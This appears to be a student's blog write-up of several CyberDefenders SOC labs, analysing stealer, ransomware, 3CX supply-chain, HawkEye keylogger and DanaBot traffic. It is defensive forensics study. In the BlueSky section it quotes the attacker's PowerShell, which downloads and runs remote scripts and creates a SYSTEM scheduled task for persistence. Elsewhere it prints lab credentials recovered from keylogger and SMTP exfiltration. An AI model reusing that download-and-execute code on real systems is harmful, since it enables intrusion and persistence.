![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794404976274-3f674c.png)

`Answer: RECORDSTEALER`

**Q9. By identifying the malware's imported DLLs, we can configure security tools to monitor for the loading or unusual usage of these specific DLLs. Can you provide the DLL utilized by the malware for privilege escalation?**

*Details > Portable Executable Info > Imports*

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794405053688-7cf042.png)

Click on each imported DLLs to inspect them further.

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794405097986-ce4456.png)

`ADVAPI32.dll` is seemingly used for privilege escalation, the others are irrelevant.

> Reference: https://learn.microsoft.com/en-us/troubleshoot/windows-client/setup-upgrade-and-drivers/dynamic-link-library

`Answer: ADVAPI32.dll`

## 9. Oski
- **Date**: Nov 10, 2026
- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 3
- **Category**: Threat Intel

We are presented with a malware hash `12c1842c3ccafe7408c23ebf292ee3d9`, and we are prompted to gather intel on this malware using online platforms.

**Q1. Determining the creation time of the malware can provide insights into its origin. What was the time of malware creation?**

*Details > History > Creation Time*

`Answer: 2022-09-28 17:40`

**Q2. Identifying the command and control (C2) server that the malware communicates with can help trace back to the attacker. Which C2 server does the malware in the PPT file communicate with?**

From *Relations > Contacted URLs | Behavior > Network Communication*, the C2 server that the malware commmunicates seems to be `http://171.22.28.221/5c06c05b7b34e8e6.php`.

`Answer: http://171.22.28.221/5c06c05b7b34e8e6.php`

**Q3. Identifying the initial actions of the malware post-infection can provide insights into its primary objectives. What is the first library that the malware requests post-infection?**

From *Relations > Contacted URLs | Behavior > Network Communication*, the (first) library the malware requests is `sqlite3.dll`.

`Answer: sqlite3.dll`

**Q4. By examining the provided [Recorded Future Triage](https://tria.ge/260730-engzhayhja) report, what RC4 key is used by the malware to decrypt its base64-encoded string?**

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794409914324-342eef.png)

`Answer: 5329514621441247975720749009`

**Q5. By examining the MITRE ATT&CK techniques displayed in the [Any.run sandbox report](https://app.any.run/tasks/d55e2294-5377-4a45-b393-f5a8b20f7d44), identify the main MITRE technique (not sub-techniques) the malware uses to steal the user’s password.**

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794410067830-6b679f.png)

`Answer: T1555`

**Q6. By examining the child processes displayed in the [Any.run sandbox report](https://app.any.run/tasks/d55e2294-5377-4a45-b393-f5a8b20f7d44), which directory does the malware target for the deletion of all DLL files?**

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794410163073-354776.png)

In `cmd.exe`, `del "C:\ProgramData\*.dll"` used the wildcard `*` to apply the deletion to all files in the folder `"C:\ProgramData\*.dll"`

`Answer: C:\ProgramData`

**Q7. Understanding the malware's behavior post-data exfiltration can give insights into its evasion techniques. By analyzing the child processes, after successfully exfiltrating the user's data, how many seconds does it take for the malware to self-delete?**

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794410315458-b5bb4e.png)

There is a 5-second timeout in the deletion.

`Answer: 5`

## 10. BlueSky Ransomware
- **Date**: Nov 11, 2026
- **Difficulty**: CyberDefenders - SOC Analyst Tier 2 - Level 4
- **Category**: Network Forensics

**Q1. Knowing the source IP of the attack allows security teams to respond to potential threats quickly. Can you identify the source IP responsible for potential port scanning activity?**

Throughout the packet, there is only an influx of `TCP [SYN]` traffic from `87.96.21.84` to `87.96.21.81`. And the ports of the packets change every single time. The `87.96.21.81` also replied `87.96.21.84` with a lot of `TCP [RST, ACK]`.

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794363358915-b453ae.png)

`Answer: 87.96.21.84`

**Q2. During the investigation, it's essential to determine the account targeted by the attacker. Can you identify the targeted account username?**

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794363765856-bf135d.png)

Immediately after the time the port scanning has finished, there is a host of [TDS](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tds/893fcc7e-8a39-4b3c-815a-773b7b982c50) traffic, with a range of message:
- TDS7 pre-login message
- Response
- Client Hello
- Server Hello, Certificate, Server Key Exchange, Server Hello Done
- Client Key Exchange, Change Cipher Spec, Encrypted Handshake Message
- Change Cipher Spec, Encrypted Handshake Message
- Application Data

We have a better view of the TDS traffic upon filtering for it:

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794364296456-d2f07a.png)

- The red part (that happened right after the port scanning) is the initial connection requests & responses of the TDS protocol.
- The yellow part is the successful authentication request & response of the TDS protocol
- The orange part is the client requests & server responses of the TDS protocol.

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794365816101-c60370.png)

The pre-login message merely contains basic information:

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794365093210-6b568b.png)

However, the successful `TDS7 login` reveals the sensitive correct credentials (including the targeted username and password).

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794365268920-6ffee7.png)

> Interestingly, the `sa` (System Administrator) username is the default built-in administrator account in Microsoft SQL Server that possesses full `sysadmin` server-level privileges.
>
> Moreover, this influx of Tabular Data Stream (TDS) traffic targeting Microsoft SQL Server (typically on TCP Port 1433) is a serious scenario that usually indicates one of three things:
> - An Active Brute-Force or Credential Stuffing Attack: Automated scanners and botnets frequently target internet-exposed SQL Servers to guess password credentials (especially for the default `sa` account).
> - Reconnaissance & Fingerprinting: Attackers send massive waves of unauthenticated PRELOGIN TDS packets to enumerate database versions, configurations, and patch levels without triggering login-failure alerts.
> - A Network Denial of Service (DoS/DDoS): Flood traffic attempting to exhaust the server’s available TCP connections, ephemeral ports, or processing queues.
>
> In our lab, it probably alludes at the first or the second case.

`Answer: sa`

**Q3. We need to determine if the attacker succeeded in gaining access. Can you provide the correct password discovered by the attacker?**

`Answer: cyb3rd3f3nd3r$`

**Q4. Attackers often change some settings to facilitate lateral movement within a network. What setting did the attacker enable to control the target host further and execute further commands?**

> Lateral movement (classified as [MITRE ATT&CK Tactic TA0008](https://attack.mitre.org/tactics/TA0008/)) refers to the techniques that cyber attackers use after gaining an initial foothold in a network to navigate sideways, escalate privileges, and reach high-value targets such as domain controllers or sensitive databases.

Follow the TCP stream of the SQL batch after the successful login:

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794368792546-0850e6.png)

We can see that the attacker has configured the setting option `xp_cmdshell`, switching from `0` to `1` to be specific.

> SQL queries normally work with database data. [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver17) is an extended stored procedure that crosses into the operating system: it asks the SQL Server machine to run a Windows command and returns the command’s text output to the SQL caller. For example, EXEC xp_cmdshell 'whoami'; reports the Windows account used to run the command. It runs synchronously, so the SQL call waits for the command to finish.
>
> The Windows permissions matter. For a highly privileged SQL Server caller, the command runs with the SQL Server service account’s permissions. A permitted caller outside the sysadmin role uses a separately configured proxy account. Because this feature can turn database access into operating system command execution, it is disabled by default on new [SQL Server installations](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option).

`Answer: xp_cmdshell`

**Q5. Process injection is often used by attackers to escalate privileges within a system. What process did the attacker inject the C2 into to gain administrative privileges?**

After having configured the `xp_cmdshell`, the SQL Batchs that follow reveals that the attacker used it to upload a executable reverse shell into `tmp`, probaly for gaining initial access.

This is seemingly corresponding to the events happened in the log. Following the task in `MSSQLSERVER`, we can see there are activities in `PowerShell`

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794369189801-b4807d.png)

And we can see the attacker used `MSFConsole`, an interactive control center platform, to inject [winlogon.exe](https://quantrimang.com/cong-nghe/windows-logon-application-la-gi-va-tai-sao-no-lai-chay-tren-he-thong-149728) as the host application.

`Answer: winlogon.exe`

**Q6. Following privilege escalation, the attacker attempted to download a file. Can you identify the URL of this file downloaded?**

After the TDS traffic, we then see an large amount of TCP & SSLv2, a bit of DNS and ICMP, and then HTTP. The first HTTP request we encounter is `GET /checking.ps1` from the attacker host. Seem like the attacker is downloading/deploying this PS1 file.

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794371339917-14c72e.png)

> A `.ps1` file is a plain text file containing a sequence of commands written for Windows PowerShell, Microsoft's automation and task-management framework.

`Answer: http://87.96.21.84/checking.ps1`

**Q7. Understanding which group Security Identifier (SID) the malicious script checks to verify the current user's privileges can provide insights into the attacker's intentions. Can you provide the specific Group SID that is being checked?**

The `checking.ps1` is the malicious script in question.

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794371371108-2de1c5.png)

Microsoft has detailed documentation about [Group SIDs](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers) here, including their definition, how they works, and its architecture:

> The components of a `SID` are easier to visualize when SIDs are converted from a binary to a string format by using standard notation: `S-R-X-Y1-Y2-Yn-1-Yn`, in that:


| Component | Description |
| --------- | ----------- |
| S | Indicates that the string is a SID |
| R	| Indicates the revision level |
| X	| Indicates the identifier authority value |
| Y	| Represents a series of subauthority values, where n is the number of values |

In the above image, at the very first line of `checking.ps1`

```
$priv = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
```

This line of code check for the SID `S-1-5-32-544`

`Answer: S-1-5-32-544`

**Q8. Windows Defender plays a critical role in defending against cyber threats. If an attacker disables it, the system becomes more vulnerable to further attacks. What are the registry keys used by the attacker to disable Windows Defender functionalities? Provide them in the same order found.**

Inspecting the `checking.ps1` deeper, we can see that the script is using the following `defenderRegistryKeys` to disable the functionalities of Windows Defender.

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794372794633-828214.png)

> According to [Microsoft Documentation](https://learn.microsoft.com/vi-vn/defender-endpoint/troubleshoot-service-startup-problems), **Windows Defender Event ID 5007** indicates that the configuration settings for Microsoft Defender Antivirus have changed.
>
> The registry path `HKLM:\SOFTWARE\Microsoft\Windows Defender` contains the configuration of Microsoft Defender Antivirus. It is the core local registry key used by Windows to store operational settings, service states, paths, and platform diagnostic information for Microsoft Defender Antivirus.

`Answer: DisableAntiSpyware, DisableRoutinelyTakingAction, DisableRealtimeMonitoring, SubmitSamplesConsent, SpynetReporting`

**Q9. Can you determine the URL of the second file downloaded by the attacker?**

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794381368178-98daf7.png)

`checking.ps1` then is called to download `del.ps1` first, and then `ichigo-lite.ps1`. Filtering for `http` for a better view in the chronological order.

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794381008104-69755d.png)

`Answer: http://87.96.21.84/del.ps1`

**Q10. Identifying malicious tasks and understanding how they were used for persistence helps in fortifying defenses against future attacks. What's the full name of the task created by the attacker to maintain persistence?**

In `checking.ps1` at the payload that download the next two files `del.ps1` and `ichigo-lite.ps1`

```
Function CleanerEtc {
    $WebClient = New-Object System.Net.WebClient
    $WebClient.DownloadFile("http://87.96.21.84/del.ps1", "C:\ProgramData\del.ps1") | Out-Null
    C:\Windows\System32\schtasks.exe /f /tn "\Microsoft\Windows\MUI\LPupdate" /tr "C:\Windows\System32\cmd.exe /c powershell -ExecutionPolicy Bypass -File C:\ProgramData\del.ps1" /ru SYSTEM /sc HOURLY /mo 4 /create | Out-Null
    Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('http://87.96.21.84/ichigo-lite.ps1'))
}
```

Notably, there is `schtasks.exe` - a command that creates a Windows Scheduled Task, which is commonplace in [MITRE ATT&CK Technique T1053.005](https://attack.mitre.org/techniques/T1053/005/). Moreover, it is designed to running a script automatically at every 4 hours `/sc HOURLY /mo 4` with the highest possible system privileges `/ru SYSTEM`, pointing at the persistence tactic.

`/tr` stands for task run, specifying the command or script to execute when the task triggers. In this case, it launches `Command Prompt (cmd.exe)` to run a PowerShell script `C:\ProgramData\del.ps1` with execution policies bypassed `-ExecutionPolicy Bypass`.

`/tn` stands for task name, which is `"\Microsoft\Windows\MUI\LPupdate"` - the answer for the question.

`Answer: \Microsoft\Windows\MUI\LPupdate`

**Q11. Based on your analysis of the second malicious file, What is the MITRE ID of the main tactic the second file tries to accomplish?**

The malicious file in question is `del.ps1`

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794383251008-01529d.png)

As we can see, the script disables some of the functions using `stop-process -name $task -Force`. At first, I supposed it was [MITRE ID TA0112 (Defense Impairment)](https://attack.mitre.org/tactics/TA0112/). But to some extent, [MITRE ID TA0005 (Stealth/Defense Evasion)](https://attack.mitre.org/tactics/TA0005/) is a better fit, since the functions that were disabled are merely monitoring tools (in order to hide the malware's sussy activities, supposedly): 
```
"taskmgr", "perfmon", "SystemExplorer", "taskman", "ProcessHacker", "procexp64", "procexp", "Procmon", "Daphne"
```

`Answer: TA0005`

**Q12. What's the invoked PowerShell script used by the attacker for dumping credentials?**

I naturally check `Invoke-PowerDump.ps1` according to the keywords of the question. Indeed, there are credentials that were dumped in this script :)

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794385112823-9fcbaf.png)

`Answer: Invoke-PowerDump.ps1`

**Q13. Understanding which credentials have been compromised is essential for assessing the extent of the data breach. What's the name of the saved text file containing the dumped credentials?**

Inspecting `ichigo-lite.ps1`

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794385479355-9f3dcf.png)

- We know that the credentials are dumped using `Invoke-PowerDump.ps1`, and this `ichigo-lite.ps1` `DownloadString` from it.
- And there is this encoded command `Invoke-PowerDump | Out-File -FilePath "C:\ProgramData\hashes.txt"` that seems to pipe the credentials into `hashes.txt`
- The script then processes those hashes in more detail afterwards, but that is beside the points.

`Answer: hashes.txt`

**Q14. Knowing the hosts targeted during the attacker's reconnaissance phase, the security team can prioritize their remediation efforts on these specific hosts. What's the name of the text file containing the discovered hosts?**

There is an aptly named file called `extracted_hosts.txt` in the mists of HTTP traffic.

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794386541769-ecdc28.png)

Indeed, it contains the packet's discovered hosts.

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794386610527-347dd5.png)

`Answer: extracted_hosts.txt`

**Q15. After hash dumping, the attacker attempted to deploy ransomware on the compromised host, spreading it to the rest of the network through previous lateral movement activities using SMB. You’re provided with the ransomware sample for further analysis. By performing behavioral analysis, what’s the name of the ransom note file?**

`Invoke-PowerDump.ps1` is the hash dumping, and we can infer that `javaw.exe` is the ransomware in play.

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794387320037-f69394.png)

Then we could go to *File > Export Objects > HTTP*

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794387939229-9b1ea4.png)

to download the ransomware and scan its hash:

`Get-FileHash -Path "javaw.exe" -Algorithm SHA256`

We get `3e035f2d7d30869ce53171ef5a0f761bfb9c14d94d9fe6da385e20b8d96dc2fb` as the result. On *VirusTotal > Behavior > Files Dropped*, we can find out the ransom note files.

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794388176659-8bf58d.png)

`Answer: # DECRYPT FILES BLUESKY #`

**Q16. In some cases, decryption tools are available for specific ransomware families. Identifying the family name can lead to a potential decryption solution. What's the name of this ransomware family?**

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794388510366-29bb8a.png)


The ransomware belongs to the `Conti` and `BlueSky` families. 

*Since the question prompts for a 7-words answer, I suppose `BlueSky` is our sought-after answer. And the name of this lab is "BlueSky Ransomware", so...*

`Answer: BlueSky`

## 11. 3CX Supply Chain
- **Date**: Nov 12, 2026
- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 4
- **Category**: Threat Intel

We are presented with a Windows Installer package `.msi`

> MSI file is a standard database file used by Microsoft Windows to install, maintain, update, and remove software.

**Q1. Understanding the scope of the attack and identifying which versions exhibit malicious behavior is crucial for making informed decisions if these compromised versions are present in the organization. How many versions of 3CX running on Windows have been flagged as malware?**

The question prompts us to investigate public threat intelligence reports on the 3CX compromise via cybersecurity vendors, such as `Zscaler`, `Unit42`, `Mandiant`, `CrowdStrik`, or `SentinelOne`

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794468566913-f19c8c.png)

There are two affected versions running on Windows.

`Answer: 2`

**Q2. Determining the age of the malware can help assess the extent of the compromise and track the evolution of malware families and variants. What's the UTC creation time of the .msi malware?**

Upload the file onto VirusTotal and start inspecting.

`Answer: 2023-03-13 06:33`

**Q3. Executable files (.exe) are frequently used as primary or secondary malware payloads, while dynamic link libraries (.dll) often load malicious code or enhance malware functionality. Analyzing files deposited by the Microsoft Software Installer (.msi) is crucial for identifying malicious files and investigating their full potential. Which malicious DLLs were dropped by the .msi file?**

There is a handful amount of `.dll` files upon inspecting `Files Dropped`

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794469051180-20a96f.png)

Which of them is the malicious one, you may ask? We can inspect them further by taking their SHA256 to view it again on the very VirusTotal

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794469175340-703e20.png)

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794469331095-bcfaf4.png)

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794469301486-462f58.png)

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794469349581-f91132.png)

As we can see,only the two files `ffmpeg.dll` and `d3dcompiler_47.dll` are marked as malicious (as trojans, to be precise), while the others are not harmful.

`Answer: ffmpeg.dll,d3dcompiler_47.dll`

**Q4. Recognizing the persistence techniques used in this incident is essential for current mitigation strategies and future defense improvements. What is the MITRE Technique ID employed by the .msi files to load the malicious DLL?**

Search for the `3CX Supply Chain Attack` campaign.

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794472386279-263519.png)

Reading further, there is a technique with a befitting description:

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794474081905-f8c1f2.png)

`Answer: T1574`

**Q5. Recognizing the malware type (threat category) is essential to your investigation, as it can offer valuable insight into the possible malicious actions you'll be examining. What is the threat category of the two malicious DLLs?**

`Answer: Trojan`

**Q6. As a threat intelligence analyst conducting dynamic analysis, it's vital to understand how malware can evade detection in virtualized environments or analysis systems. This knowledge will help you effectively mitigate or address these evasive tactics. What is the MITRE ID for the virtualization/sandbox evasion techniques used by the two malicious DLLs?**

`Virtualization/Sandbox Evasion` falls below `Stealth` and `Discovery`.

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794474655960-56ae31.png)

`Answer: T1497`

**Q7. When conducting malware analysis and reverse engineering, understanding anti-analysis techniques is vital to avoid wasting time. Which hypervisor is targeted by the anti-analysis techniques in the ffmpeg.dll file?**

Investigate the `ffmpeg.dll` on VirusTotal using its hash. Navigate to *Behavior > Capabilities*

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794475673568-0633ef.png)

`Answer: VMware`

**Q8. Identifying the cryptographic method used in malware is crucial for understanding the techniques employed to bypass defense mechanisms and execute its functions fully. What encryption algorithm is used by the ffmpeg.dll file?**

Such cryptographic method can be seen in the previous image, but you can see it on a [cybersecurity vendor](https://unit42.paloaltonetworks.com/3cxdesktopapp-supply-chain-attack/), too.

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794475810235-b70aed.png)

`Answer: RC4`

**Q9. As an analyst, you've recognized some TTPs involved in the incident, but identifying the APT group responsible will help you search for their usual TTPs and uncover other potential malicious activities. Which group is responsible for this attack?**

The question asks for the threat actor, so I naturally went to `Malpedia`.

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794468874543-884af4.png)

`Answer: Lazarus`

## 12. Web Investigation
- **Date**: Nov 12, 2026
- **Category**: Network Forensics


## 13. HawkEye
- **Date**: Nov 13, 2026
- **Difficulty**: CyberDefenders - SOC Analyst Tier 2 - Level 6
- **Category**: Network Forensics

**Q1. How many packets does the capture have?**

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794550370387-ac8b40.png)

`Answer: 4003`

**Q2. At what time was the first packet captured (UTC)?**

`Answer: 2019-04-10 20:37`

**Q3. What is the duration of the capture?**

Looking at the last frame, 

`UTC Arrival Time: Apr 10, 2019 21:40:48.690963000 UTC`

While the first packet was captured at `Apr 10, 2019 20:37:07.129730000 UTC`

Subtract the UTC arrival time of the last capture and the first one above, we get `01:03:41`

`Answer: 01:03:41`

**Q4. What is the most active computer at the link level?**

> Ethernet is a common link-layer technology. The link layer handles communication across one local link using frames and MAC addresses. Above it, the network layer uses IP addresses to move packets between networks.

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794551242888-8b2ada.png)

`Answer: 00:08:02:1c:47:ae`

**Q5. Manufacturer of the NIC of the most active system at the link level?**

> A network interface controller is a computer hardware component that connects a computer to a computer network.

Simply perform a [MAC Address lookup](https://maclookup.app/search/result?mac=00:08:02:1c:47:ae) for the address above `00:08:02:1c:47:ae`

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794552135257-92d7ff.png)

The address is registered to `Hewlett Packard`, also known as `Hewlett-Packard` or `HP`

`Answer: Hewlett-Packard`

**Q6. Where is the headquarter of the company that manufactured the NIC of the most active computer at the link level?**

Having known the organization, I simply search for its HQ:

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794552725331-6fb33c.png)

`Answer: Palo Alto`

**Q7. The organization works with private addressing and netmask /24. How many computers in the organization are involved in the capture?**

Inspect the *Statistics > Endpoints*

> A `/24` netmask is commonly used for `IPv4` subnets. That notation also works for `IPv6`, but there is no `IPv6` in this packet. You can learn more about such networking on Youtube, or there is a detailed documentation about [TCP/IP Adressing & Subnetting](https://learn.microsoft.com/en-us/troubleshoot/windows-client/networking/tcpip-addressing-and-subnetting) here by Microsoft. Anyhow, the private ranges of `IPv4` are:
> - `10.0.0.0` to `10.255.255.255`
> - `172.16.0.0` to `172.31.255.255`
> - `192.168.0.0` to `192.168.255.255`

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794556525212-60bc30.png)

`Answer: 3`

**Q8. What is the name of the most active computer at the network level?**

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794556773140-0c517d.png)

A computer name at the network level can be simply put as a hostname. Throughout the packet, there is a prevalent one with the name `beijing-5cd1-pc`

`Answer: beijing-5cd1-pc`

**Q9. What is the IP of the organization's DNS server?**

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794557453307-d34801.png)

The attacker sends a multitude of DNS requests, and the victim (the organization) responds correspondingly. In the image, the responses come from the IP address `10.4.10.4`

`Answer: 10.4.10.4`

**Q10. What domain is the victim asking about in packet 204?**

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794557602549-92fd88.png)

`Answer: proforma-invoices.com`

**Q11. What is the IP of the domain in the previous question?**

Upon following the stream of the previous packet, the IP address is revealed to be `217.182.138.150`

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794557648976-980a14.png)

`Answer: 217.182.138.150`

**Q12. Indicate the country to which the IP in the previous section belongs.**

Simply perform an IP lookup

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794557771899-5c318e.png)

`Answer: France`

**Q13. What operating system does the victim's computer run?**

Filter for the IP address of the victim's machine:

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794558014503-2b8792.png)

We can see an anomalous downloading of an executable. Following the stream reveals more information.

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794558113490-6b172b.png)

`Answer: Windows NT 6.1`

**Q14. What is the name of the malicious file downloaded by the accountant?**

`Answer: tkraw_Protected99.exe`

**Q15. What is the md5 hash of the downloaded file?**

Export the file and upload it to VirusTotal.

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794546519767-5b8d95.png)

`Answer: 71826ba081e303866ce2a2534491a2f7`

**Q16. What software runs the webserver that hosts the malware?**

The stream above has already revealed the server in the question

`Answer: LiteSpeed`

**Q17. What is the public IP of the victim's computer?**

The large amount of TCP traffic indicates a file download. Most of the packets shown travel from `10.4.10.132:49204` to `217.182.138.150:80` and vice versa, and their TCP sequence numbers keep increasing. The smaller packets going back are mainly acknowledgments (ACK) confirming receipt. The HTTP response is marked `200 OK` with the content type `application/x-msdownload`, confirms that the host downloaded a Windows executable file. The TCP acknowledgment number near 2,025,705 suggests roughly 2 MB of data arrived in that connection. These TCP rows are pieces of the same, the only transfer, not thousands of separate download requests.

> `PSH (Push)` tells the receiving device's network stack to immediately flush its buffer and deliver the enclosed data straight to the application (like a chat app, SSH terminal, or browser), rather than waiting to collect more bytes for efficiency.

After that, the victim's internal IP communicates with `23.229.162.69` for mail transferring. But before that, we can see that the source address has contacted `66.171.248.178` for an IP lookup. In the result `.txt`, we can see the public IP address of the victim's machine, which is `173.66.146.112`

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794563219615-6d7be0.png)

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794562886954-0bcd64.png)

**Q18. In which country is the email server to which the stolen information is sent?**

The mail transferring is heading towards `23.229.162.69`, so we simply perform an IP lookup.

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794581622454-cbd6f7.png)

`Answer: United States`

**Q19. Analyzing the first extraction of information. What software runs the email server to which the stolen data is sent?**

In the SMTP traffic, the information about the software always appear at the top of the stream.

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794583069942-6258cf.png)


> [Exim](https://en.wikipedia.org/wiki/Exim) is a mail transfer agent (MTA) used on Unix-like operating systems.
>
> [Exim](https://www.exim.org/) versions 4.87 through 4.91 are affected by a critical remote command execution (RCE) and local privilege escalation vulnerability known as CVE-2019-10149 (titled "The Return of the WIZard")

`Answer: Exim 4.91`

**Q20. To which email account is the stolen information sent?**

This information can also be seen in the SMTP traffic, at the `AUTH login c2FsZXMuZGVsQG1hY3dpbmxvZ2lzdGljcy5pbg==`

as well as in the fields `<MAIL FROM>` and `<RCPT TO>` that follows

`Answer: sales.del@macwinlogistics.in`

**Q21. What is the password used by the malware to send the email?**

Right below `AUTH login`:

```
334 UGFzc3dvcmQ6

U2FsZXNAMjM=

235 Authentication succeeded
```

which is decoded into

```
334 Password:

Sales@23

235 Authentication succeeded
```

`Answer: Sales@23`

**Q22. Which malware variant exfiltrated the data?**

Read the encoded message in the SMTP traffic with CyberChef

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794584360491-3032dd.png)

```
HawkEye Keylogger - Reborn v9
Passwords Logs
roman.mcguire \ BEIJING-5CD1-PC

==================================================
URL               : https://login.aol.com/account/challenge/password
Web Browser       : Internet Explorer 7.0 - 9.0
User Name         : roman.mcguire914@aol.com
Password          : P@ssw0rd$
Password Strength : Very Strong
User Name Field   : 
Password Field    : 
Created Time      : 
Modified Time     : 
Filename          : 
==================================================

==================================================
URL               : https://www.bankofamerica.com/
Web Browser       : Chrome
User Name         : roman.mcguire
Password          : P@ssw0rd$
Password Strength : Very Strong
User Name Field   : onlineId1
Password Field    : passcode1
Created Time      : 4/10/2019 2:35:17 AM
Modified Time     : 
Filename          : C:\Users\roman.mcguire\AppData\Local\Google\Chrome\User Data\Default\Login Data
==================================================

==================================================
Name              : Roman McGuire
Application       : MS Outlook 2002/2003/2007/2010
Email             : roman.mcguire@pizzajukebox.com
Server            : pop.pizzajukebox.com
Server Port       : 995
Secured           : No
Type              : POP3
User              : roman.mcguire
Password          : P@ssw0rd$
Profile           : Outlook
Password Strength : Very Strong
SMTP Server       : smtp.pizzajukebox.com
SMTP Server Port  : 587
==================================================

```

`Answer: Reborn v9`

**Q23. What are the bankofamerica access credentials? (username:password)**

`Answer: roman.mcguire:P@ssw0rd$`

**Q24. Every how many minutes does the collected data get exfiltrated?**

The email is sent every 10 minutes, starting with a `GET` request in `HTTP` protocol. You can inspect the SMTP traffic, and the result would be the same: the block of message is transferred at the 10 minutes interval.

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794584711752-09d026.png)

`Answer: 10`

## 14. DanaBot
- **Date**: Nov 13, 2026
- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 3
- **Category**: Network Forensics

**Q1. Which IP address was used by the attacker during the initial access?**

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794625260655-fb3e32.png)

Such TCP & HTTP requests from the attacker revolve around `login.php`. `10.2.14.101` is probably the attacker's IP address, and it can be seen across the packet capture. On the other hand, `62.173.142.148` only appears in this stage of gaining initial foothold, thus our answer to this question.

`Answer: 62.173.142.148`

**Q2. What is the name of the malicious file used for initial access?**

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794627597850-9c306a.png)

Follow the GET request for initial access, we can see the script name is `allegato_708.js`

`Answer: allegato_708.js`

**Q3. What is the SHA-256 hash of the malicious file used for initial access?**

Paste the script into a SHA256 computer

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794627698666-98c994.png)

`Answer: 847b4ad90b1daba2d9117a8e05776f3f902dda593fb1252289538acf476c4268`

**Q4. Which process was used to execute the malicious file?**

Use its SHA-256 hash to investigate further on VirusTotal.

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794628356703-371065.png)

> When JavaScript files are executed on Windows systems, they typically use a specific interpreter. `wscript.exe` is that built-in Windows component responsible for executing .js files.

`Answer: wscript.exe`

**Q5. What is the file extension of the second malicious file utilized by the attacker?**

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794628904397-e694d1.png)

Scroll down a little bit, we can see there is a GET request to `/resource.dll`, which is our second malicious file.

`Answer: .dll`

**Q6. What is the MD5 hash of the second malicious file?**

Export the file and check the hash on VirusTotal.

`Answer: e758e07113016aca55d9eda2b0ffeebe`

## 15. XLMRat
- **Date**: Nov 14, 2026
- **Category**: Network Forensics

## xx. HoneyBOT
- **Date**: Nov xx, 2026
- **Difficulty**: CyberDefenders - SOC Analyst Tier 2 - Level 8
- **Category**: Endpoint Forensics

## xx. RedLine
- **Date**: Nov xx, 2026
- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 3
- **Category**: Endpoint Forensics

## xx. Reveal
- **Date**: Nov xx, 2026
- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 4
- **Category**: Endpoint Forensics





